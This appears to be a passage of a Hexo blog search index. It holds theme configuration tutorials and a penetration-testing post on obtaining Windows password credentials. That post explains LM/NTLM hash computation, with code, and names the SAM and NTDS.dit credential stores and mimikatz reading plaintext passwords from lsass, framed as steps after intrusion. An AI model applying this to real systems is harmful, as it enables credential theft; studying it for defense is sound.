href="https://cloud.tencent.com/developer/article/2024117">hexo-butterfly-搜索系统引入</a></p></li><li><p><a href="https://www.cnblogs.com/yyyzyyyz/p/15542401.html">hexo-butterfly魔改记录</a></p></li><li><p><a href="https://www.jianshu.com/p/0b1fccce74e0">利用Hexo在多台电脑上提交和更新github pages博客</a></p></li><li><p>巨好用：<a href="https://blog.eson.org/pub/e2f6e239/#:~:text=hexo-auto-category%20%E6%A0%B9%E6%8D%AE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%20%28Markdown%29%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%87%AA%E5%8A%A8%E5%88%86%E7%B1%BB%EF%BC%8C%E5%8D%B3%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90,markdown%20%E7%9A%84front-matter%E4%B8%AD%E7%9A%84%20categories%20%E5%8F%98%E9%87%8F%E3%80%82">【Hexo插件系列】日志的自动分类插件 hexo-auto-category</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 部署 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-写作markdown内的配置</title>
      <link href="/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<ul><li><p>Front-matter</p><blockquote><p>Front-matter 是 markdown 文件最上方以 — 分隔的区域，用于指定个别档案的变数。</p><blockquote><p>Page Front-matter 用于页面配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】页面标题</span><br><span class="line">date【必需】页面创建日期</span><br><span class="line">type【必需】标籤、分类和友情链接三个页面需要配置</span><br><span class="line">updated【可选】页面更新日期</span><br><span class="line">description【可选】页面描述</span><br><span class="line">keywords【可选】页面关键字</span><br><span class="line">comments【可选】显示页面评论模块(默认 true)</span><br><span class="line">top_img【可选】页面顶部图片</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br></pre></td></tr></table></figure><p>Post Front-matter 用于文章页配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】文章标题</span><br><span class="line">date【必需】文章创建日期</span><br><span class="line">updated【可选】文章更新日期</span><br><span class="line">tags【可选】文章标籤</span><br><span class="line">categories【可选】文章分类</span><br><span class="line">keywords【可选】文章关键字</span><br><span class="line">description【可选】文章描述</span><br><span class="line">top_img【可选】文章顶部图片</span><br><span class="line">cover【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false/图片地址/留空)</span><br><span class="line">comments【可选】显示文章评论模块(默认 true)</span><br><span class="line">toc【可选】显示文章TOC(默认为设置中toc的enable配置)</span><br><span class="line">toc_number【可选】显示toc_number(默认为设置中toc的number配置)</span><br><span class="line">toc_style_simple【可选】显示 toc 简洁模式</span><br><span class="line">copyright【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">top:置顶</span><br><span class="line">sticky: 1你可以直接在文章的front-matter区域里添加属性来把这篇文章置顶。数值越大，置顶的优先级越大。</span><br><span class="line">toc_max_depth:最大几级目录</span><br><span class="line">link:标题的链接</span><br><span class="line">photos:</span><br></pre></td></tr></table></figure></blockquote></blockquote></li><li><p>文章页 的 top_img ，请到对应的 md 页面，设置front-matter中的top_img</p></li></ul><p>属性值：</p><blockquote><ul><li><p>留空</p></li><li><p>true - 可选择颜色：</p><blockquote><ul><li><p>HEX值 - #0000FF</p></li><li><p>RGB值 - rgb(0,0,255)</p></li><li><p>顔色单词 - orange</p></li><li><p>渐变色 - linear-gradient( 135deg, #E2B0FF 10%, #9F44D3 100%)</p><p>​  linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)</p></li></ul></blockquote></li><li><p>false - 显示默认的顔色</p></li><li><p>transparent - 透明</p></li><li><p>img链接：相对或者绝对路径</p></li></ul></blockquote><ul><li><p>文章封面:文章的markdown文档上,在Front-matter添加cover,并填上要显示的图片地址。如果不配置cover,可以设置显示默认的cover.(已经设置了很多张随机了~~)</p></li><li><p>如果有文章（例如：转载文章）不需要显示版权，可以在文章Front-matter单独设置<code>copyright: false</code></p></li><li><p>在文章页，会有一个目录，用于显示TOC。可以为特定的文章配置，在你的文章md文件的头部，加入toc_number和toc，并配置true或者false即可。主题会优先判断文章Markdown的Front-matter是否有配置，如有，则以Front-matter的配置为准。否则，以主题配置文件中的配置为准</p></li><li><p>如果你需要展示的内容太多，可以把它隐藏在收缩框里，需要时再把它展开。( display 不能包含英文逗号，可用&amp;sbquo;)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% hideToggle display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">&#123;% hideToggle Butterfly安装方法 %&#125;</span><br><span class="line">在你的博客根目录里</span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">如果想要安装比较新的dev分支，可以</span><br><span class="line">git clone -b dev https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br></pre></td></tr></table></figure></li><li><p>Tabs使用方法</p></li></ul><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : Unique name of tabs block tag without comma.</span><br><span class="line"><span class="code">                Will be used in #id&#x27;s as prefix for each tab with their index numbers.</span></span><br><span class="line"><span class="code">                If there are whitespaces in name, for generate #id all whitespaces will replaced by dashes.</span></span><br><span class="line"><span class="code">                Only for current url of post/page must be unique!</span></span><br><span class="line"><span class="code">[index]       : Index number of active tab.</span></span><br><span class="line"><span class="code">                If not specified, first tab (1) will be selected.</span></span><br><span class="line"><span class="code">                If index is -1, no tab will be selected. It&#x27;s will be something like spoiler.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[Tab caption] : Caption of current tab.</span></span><br><span class="line"><span class="code">                If not caption specified, unique name with tab index suffix will be used as caption of tab.</span></span><br><span class="line"><span class="code">                If not caption specified, but specified icon, caption will empty.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[@icon]       : FontAwesome icon name (full-name, look like &#x27;fas fa-font&#x27;)</span></span><br><span class="line"><span class="code">                Can be specified with or without space; e.g. &#x27;Tab caption @icon&#x27; similar to &#x27;Tab caption@icon&#x27;.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br></pre></td></tr></table></figure><p>Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><ul><li>评论数据管理</li></ul><p>由于Valine 是无后端评论系统，所以也就没有开发评论数据管理功能。请自行登录<code>Leancloud应用</code>管理。</p><p>具体步骤：<code>登录</code>&gt;<code>选择你创建的应用</code>&gt;<code>存储</code>&gt;选择Class <code>Comment</code>，然后就可以尽情的发挥你的权利啦(～￣▽￣)～</p><blockquote><p>当然，你也可以配合 <a href="https://github.com/DesertsP">@DesertsP</a> 开发的 <a href="https://github.com/DesertsP/Valine-Admin">Valine-Admin</a> 进行<code>评论数据管理</code></p></blockquote><p>注意事项</p><p>在 Hexo 博客中，评论的功能在所有页面都默认开启，但是有的时候我们在页面上不需要显示评论功能，例如分类，标记页面我们并不需要评论功能。</p><p>在 <code>Front-matter</code> 中通过<code>comments</code>属性设置<code>true</code>或<code>false</code>控制该页面或者是文章的评论功能是否打开，如下：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: Tags</span><br><span class="line">date: 2019-12-19 16:10:19</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><ul><li>hexo设置永久文内链接，自定义跳转到本站的其他博客：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link 文章文件名(不要后缀) 显示文字(可自定义，一般写文章标题) %&#125;</span><br></pre></td></tr></table></figure><p>refer:</p><blockquote><ul><li><a href="https://butterfly.js.org/posts/4aa8abbe/#timeline">Butterfly 安装文档(三) 主题配置-1</a></li><li><a href="https://www.jianshu.com/p/b9e73c881729">Hexo 集成 Valine 评论系统</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x25 - Windows密码凭证获取</title>
      <link href="/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"/>
      <url>/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>我们黑进内网后，最直接获取权限的方法自然是直接获取用户凭证。</p><h1 id="Windows-HASH"><a href="#Windows-HASH" class="headerlink" title="Windows HASH"></a>Windows HASH</h1><h2 id="HASH简介"><a href="#HASH简介" class="headerlink" title="HASH简介"></a>HASH简介</h2><p>hash ，一般翻译做散列，或音译为哈希，所谓哈希，就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串。</p><p>这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p><h2 id="windows-HASH简介"><a href="#windows-HASH简介" class="headerlink" title="windows HASH简介"></a>windows HASH简介</h2><p>Windows  加密过的密码口令，我们称之为 hash<br>Windows  系统使用两种方法对用户的密码进行哈希处理，它们分别是 <strong>LAN Manager（LM） 哈希</strong>和 <strong>NT LAN Manager（NTLM）  哈希</strong>。<br>现在已经有了更新的 <strong>NTLMv2  以及 Kerberos</strong>  验证体系。</p><blockquote><p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p></blockquote><h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM-HASH"></a>LM-HASH</h2><h3 id="LM-HASH简介"><a href="#LM-HASH简介" class="headerlink" title="LM-HASH简介"></a>LM-HASH简介</h3><p>LAN Manager（LM）哈希是Windows系统所用的第一种密码哈希算法，是一种较古老的Hash，在LAN Manager协议中使用，<strong>非常容易通过暴力破解获取明文凭据</strong>。<br>它只有唯一一个版本且一直用到了 NT LAN Manager（NTLM） 哈希的出现，在 Windows XP &#x2F; Windows Server 2003  之前， 它是Windows上占主导地位的密码存储算法。<br>从 Windows Vista &#x2F; Windows Server 2008  开始，默认情况下已禁用该算法。<br><strong>LM  算法是在 DES  基础上实现的，不区分字母大小写。</strong></p><h3 id="LM-HASH生成原理"><a href="#LM-HASH生成原理" class="headerlink" title="LM-HASH生成原理"></a>LM-HASH生成原理</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290753428.png" alt="image-20220729075336294"></p><p>假设用户密码为：password</p><ol><li>用户的密码被限制为<strong>最多14个字符</strong>。</li><li>将用户密码所有字符转换为<strong>大写</strong>： PASSWORD</li><li>密码转换为<strong>16进制字符串</strong>，，密码长度不足14个字符将<strong>用0填充到14个字符</strong></li><li>这14个字符将被<strong>分成两半</strong>： PASSWOR D000000</li><li>每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7位为一组末尾加0（奇偶校验位)，组成新的编码（str_to_key()函数处理）,因此结果为64位： 1101000-&gt; 1101000 0 ，在将这些奇偶校验位相拼接之后，分别作为DES key。</li><li>分别用生成的两个密钥作为key 对 <strong><code>KGS!@#$%</code></strong>  进行DES加密： PASSWOR &#x3D;E52CAC67419A9A22<br> D000000 &#x3D; 4A3B108F3FA6CB6D</li><li>将加密后的两组拼接在一起，得到LM HASH值： E52CAC67419A9A22 4A3B108F3FA6CB6D</li></ol><h3 id="使用python得到LM-HASH值："><a href="#使用python得到LM-HASH值：" class="headerlink" title="使用python得到LM HASH值："></a>使用python得到LM HASH值：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;from passlib.hash import lmhash;print(lmhash.hash(&#x27;password&#x27;))&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">group_just</span>(<span class="params">length,text</span>):</span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="built_in">int</span>(length), text) <span class="comment"># [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span></span><br><span class="line">    text_area_padding = [i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = <span class="built_in">hex</span>(<span class="built_in">int</span>(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">&quot;L&quot;</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        hex_int = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lm_hash</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">&quot;hex&quot;</span>).ljust(<span class="number">28</span>,<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line"><span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    <span class="built_in">print</span>(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(left_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(right_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">hash</span> = lm_hash(<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="LM-HASH缺点"><a href="#LM-HASH缺点" class="headerlink" title="LM-HASH缺点"></a>LM-HASH缺点</h3><ol><li>密码长度最大只能为14个字符</li><li>密码不区分大小写 </li><li>如果密码强度是小于7位，那么第二个分组加密后的结果肯定是 aad3b435b51404ee ，如果我们看到 lm hash 的结尾是 aad3b435b51404ee ，就可以很轻易的发现密码强度少于7位</li><li>一个14个字符的密码分成7+7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度成倍增加，因为攻击者需要将7个字符（而不是14个字符）强制暴力破解。这使得14个字符的密码的有效强度等于，或者是7个字符的密码的两倍，该密码的复杂度明显低于14个字符的密码的理论强度</li><li>DES密码强度不高</li></ol><h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM-HASH"></a>NTLM-HASH</h2><h3 id="NTLM-HASH简介"><a href="#NTLM-HASH简介" class="headerlink" title="NTLM-HASH简介"></a>NTLM-HASH简介</h3><p>NT LAN Manager（NTLM） 哈希是Windows系统认可的另一种算法，用于替代古老的LM-Hash，一般指Windows系统下 <strong>Security Account Manager（SAM） 中保存的用户密码hash</strong>，在 Windows Vista&#x2F;Windows 7&#x2F;Windows Server 2008 以及后面的系统中，NTLM哈希算法默认启用。</p><p>通常意义上的NTLM Hash指存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH（哈希传递），并且通常存在于LSASS进程中，便于 SSP（NTLM 安全支持提供程序）使用</p><h3 id="NTLM-HASH生成原理"><a href="#NTLM-HASH生成原理" class="headerlink" title="NTLM-HASH生成原理"></a>NTLM-HASH生成原理</h3><ol><li>先将用户密码转换为十六进制格式。</li><li>将十六进制格式的密码进行 Unicode 编码。</li><li>使用 MD4 摘要算法对 Unicode  编码数据进行 Hash  计算</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import hashlib,binascii;print binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-16le&#x27;)).digest())&quot;</span><br><span class="line"></span><br><span class="line">python3 -c &quot;import hashlib,binascii;print(binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-</span><br><span class="line">16le&#x27;)).digest()).decode())&quot;</span><br></pre></td></tr></table></figure><h2 id="HASH格式"><a href="#HASH格式" class="headerlink" title="HASH格式"></a>HASH格式</h2><p>Windows  的系统密码 hash  默认情况下一般由两部分组成：第一部分是 LM-hash ，第二部分是 NTLM-hash 。<br>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290800924.png" alt="image-20220729080026827"></p><p>前面三个系统，当密码超过14位的时候会采用NTLM加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名称:RID:LM-HASH值:NTLM-HASH值</span><br><span class="line">test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</span><br></pre></td></tr></table></figure><p>前一部分是LM Hash，后一部分是NTLM Hash</p><p>当LM Hash是 AAD3B435B51404EEAAD3B435B51404EE  这表示 空密码或者是未使用LM_HASH</p><h3 id="sid和rid"><a href="#sid和rid" class="headerlink" title="sid和rid"></a>sid和rid</h3><ul><li>rid是系统对用户的唯一标识。就和sid一样。</li><li>我们拿到rid后，就可以大概的判断现在的用户大概的权限是什么</li><li>在计算机中中sid前面若干位都是相同的！只有最后面的rid是不同的！</li><li>系统自带的用户其rid都在1000内，用户自建的用户rid在1000以上</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sid:</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">rid:(即sid末尾的三位或者四位数字)：</span><br><span class="line">500</span><br><span class="line">503</span><br><span class="line">1035</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统用户账户的信息</span><br><span class="line">wmic useraccount list brief </span><br><span class="line"></span><br><span class="line">C:\Users\86063&gt;wmic useraccount list brief</span><br><span class="line">AccountType  Caption                   Domain  FullName  Name                SID</span><br><span class="line">512          ALVIN\Administrator       ALVIN             Administrator       S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">512          ALVIN\DefaultAccount      ALVIN             DefaultAccount      S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">512          ALVIN\Guest               ALVIN             Guest               S-1-5-21-1963647555-2248327119-2118898007-501</span><br><span class="line">512          ALVIN\Visitor             ALVIN             Visitor             S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">512          ALVIN\WDAGUtilityAccount  ALVIN             WDAGUtilityAccount  S-1-5-21-1963647555-2248327119-2118898007-504</span><br><span class="line">512          ALVIN\华年                ALVIN   Alvin Li  华年                S-1-5-21-1963647555-2248327119-2118898007-1001</span><br></pre></td></tr></table></figure><h2 id="HASH存储位置"><a href="#HASH存储位置" class="headerlink" title="HASH存储位置"></a>HASH存储位置</h2><p>windows hash  一般存储在两个地方：</p><ul><li>SAM  文件，存储在本机，对应本地用户</li><li>NTDS.DIT  文件，存储在域控上，对应域用户</li></ul><p>文件位置：(得要用工具查看)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAM：</span><br><span class="line">C:\windows\system32\config\SAM</span><br><span class="line">NTDS.DIT：得到此文件，即可拿下域控</span><br><span class="line">C:\windows\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure><h1 id="Windows认证机制"><a href="#Windows认证机制" class="headerlink" title="Windows认证机制"></a>Windows认证机制</h1><p>Windows的认证包括三个部分：</p><ul><li>本地认证：用户直接操作计算机登录账户</li><li>网络认证：远程连接到工作组中的某个设备</li><li>域认证：登陆到域环境中的某个设备（后面讲到域的时候，会专门讲）</li></ul><p>开始之前需要先区分这几个概念：</p><blockquote><ul><li>NTLM Hash：存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果</li><li>Net-NTLM hash：通常是指网络环境下 NTLM认证中的 Hash~网络认证吼</li><li>NTLM：除 Kerberos之外的一种网络认证协议，只支持 Windows</li></ul></blockquote><h2 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h2><p>本地认证：即当用户登录时，系统将用户输入的明文密码加密成 <em>NTLM Hash</em>，与 SAM数据库中的 <em>NTLM Hash</em> 进行比较，从而实现认证</p><h3 id="认证过程："><a href="#认证过程：" class="headerlink" title="认证过程："></a>认证过程：</h3><p>用户注销、重启、锁屏后，操作系统会让 winlogon显示登录界面，也就是输入框，接收输入后，将密码交给 lsass进程，***<u>这个进程中会存一份明文密码</u>***，将明文密码加密成NTLM Hash，对比 SAM数据库中的 Hash进行验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure><blockquote><ol><li>用户在winlogon.exe中输入密码</li><li>lsass.exe收到密码后将用户输入的密码计算成NTLM Hash</li><li>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对</li><li>匹配则登陆成功，不匹配则登陆失败</li></ol></blockquote><p>NTLM哈希，是一种单向哈希算法，Windows将用户的密码计算成NTLM哈希之后才存储在电脑中。(上文有讲)</p><h3 id="细节："><a href="#细节：" class="headerlink" title="细节："></a>细节：</h3><p>更具体体会上面的步骤，一些细节需要讲解：</p><ul><li><p>winlogon.exe：我们Windows登录界面是由一个叫winlogon.exe的进程产生（也就是通俗来讲的登陆界面），用户在该进程中输入的密码交由lsass.exe处理</p></li><li><p>lsass.exe：<strong>本地认证中用来处理用户输入密码的进程为 lsass.exe  ,密码会在这个进程中明文保存，供该进程将密码计算成 NTLM Hash  与 sam  进行比对，我们使用 mimikatz  来获取的明文密码，便是在这个进程中读取到的</strong></p><p>lsass.exe(本地安全授权进程local security authority process)。Windows系统的安全机制（系统进程）。用于本地安全和登陆策略。</p></li><li><p>SAM：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAM文件的路径是 %SystemRoot%\system32\config\sam</span><br></pre></td></tr></table></figure></li></ul><p>大致的运算流程为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户密码 -&gt; HEX编码 -&gt; Unicode编码 -&gt; MD4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install passlib</span><br><span class="line">&gt;&gt;&gt; from passlib.hash import nthash</span><br><span class="line">&gt;&gt;&gt; print(nthash.hash(&#x27;admin&#x27;))</span><br><span class="line">209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><h2 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="Windows网络认证"></a>Windows网络认证</h2><p>网络认证即在工作组环境下远程登陆另一台电脑所采用的认证机制，可以以Windows的远程桌面（rdp协议）为例<br>NTLM  协议的认证过程分为三步，也叫<strong>挑战&#x2F;响应机制</strong>：</p><h3 id="1、协商"><a href="#1、协商" class="headerlink" title="1、协商"></a>1、协商</h3><p>双方确定使用的协议版本， NTLM  存在V1和V2两个版本，即 Net-NTLM v1 